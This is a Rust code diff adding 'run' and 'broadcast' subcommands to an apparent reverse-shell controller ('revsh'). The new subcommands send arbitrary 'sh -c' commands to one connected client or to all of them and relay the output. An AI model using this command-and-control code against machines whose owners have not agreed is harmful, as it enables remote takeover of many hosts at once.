@@ -1,4 +1,5 @@
 use tokio::net::UnixStream;
+use std::io::Write;
 use clap::Parser;
 
 use revsh_common::*;
@@ -15,7 +16,16 @@ enum Action {
     #[command(name = "list")]
     ListClients {
         
-    }
+    },
+    #[command(name = "run")]
+    RunCommand {
+        target: UID,
+        command: String,
+    },
+    #[command(name = "broadcast")]
+    RunBroadcast {
+        command: String,
+    },
 }
   
 #[tokio::main]
@@ -64,6 +74,69 @@ async fn main() -> anyhow::Result<()> {
                 );
             }
             println!("--{}---{}---{}---", "-".repeat(id_length), "-".repeat(longest_addr), "-".repeat(age_length));
+        },
+        Action::RunCommand { target, command } => {
+            let created_id = new_uid();
+            send_message_into(
+                &InCliMessage::SendMessageTo {
+                    target,
+                    message: S2CMessage::Execute {
+                        pid: created_id,
+                        exe: "sh".into(),
+                        args: vec!["-c".into(), command],
+                        print_output: false
+                    },
+                },
+                &mut stream,
+            ).await.unwrap();
+
+            loop {
+                let e: OutCliMessage = recv_message_from(&mut stream).await.unwrap();
+                match e {
+                    OutCliMessage::ClientMessage {
+                        sender,
+                        message: C2SMessage::ProcessOutput { pid, data }
+                    } if sender == target && pid == created_id => {
+                        let mut a = std::io::stdout().lock();
+                        a.write_all(&data).unwrap();
+                    },
+                    OutCliMessage::ClientMessage {
+                        sender,
+                        message: C2SMessage::ProcessStopped { pid, exit_code }
+                    } if sender == target && pid == created_id => {
+                        std::process::exit(exit_code);
+                    },
+                    _ => (),
+                }
+            };
+        },
+        Action::RunBroadcast { command } => {
+            let created_id = new_uid();
+            send_message_into(
+                &InCliMessage::BroadcastMessage {
+                    message: S2CMessage::Execute {
+                        pid: created_id,
+                        exe: "sh".into(),
+                        args: vec!["-c".into(), command],
+                        print_output: false
+                    },
+                },
+                &mut stream,
+            ).await.unwrap();
+
+            loop {
+                let e: OutCliMessage = recv_message_from(&mut stream).await.unwrap();
+                match e {
+                    OutCliMessage::ClientMessage {
+                        sender: _,
+                        message: C2SMessage::ProcessOutput { pid, data }
+                    } if pid == created_id => {
+                        let mut a = std::io::stdout().lock();
+                        a.write_all(&data).unwrap();
+                    },
+                    _ => (),
+                }
+            };
         }
     }
   
